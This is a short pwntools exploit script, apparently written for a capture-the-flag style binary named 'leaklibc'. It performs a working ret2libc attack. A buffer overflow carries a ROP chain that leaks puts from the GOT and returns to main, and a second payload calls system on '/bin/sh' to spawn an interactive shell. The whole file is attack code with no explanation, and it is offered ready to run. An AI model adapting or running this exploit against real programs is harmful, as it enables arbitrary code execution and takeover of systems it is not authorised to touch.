from pwn import *

context.arch = "amd64"
context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./leaklibc')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        io = gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        io.recvline()
        return io
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

puts_plt = 0x401030
pop_rdi = 0x004011d3
bin_sh_offset = 0x116af8
system_offset = -0x2cb50
puts_got = 0x404018
main = 0x401136

payload = 'A'*0x18
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

io = start()
io.recvline()
io.sendline(payload)
puts_addr = unpack(io.recvline().split('\n')[0]+'\x00\x00',64)
print 'Puts address:'+str(hex(puts_addr))

payload = 'A'*0x18
payload += p64(pop_rdi)
payload += p64(puts_addr+bin_sh_offset)
payload += p64(puts_addr+system_offset)

io.recvline()
io.sendline(payload)
io.interactive()

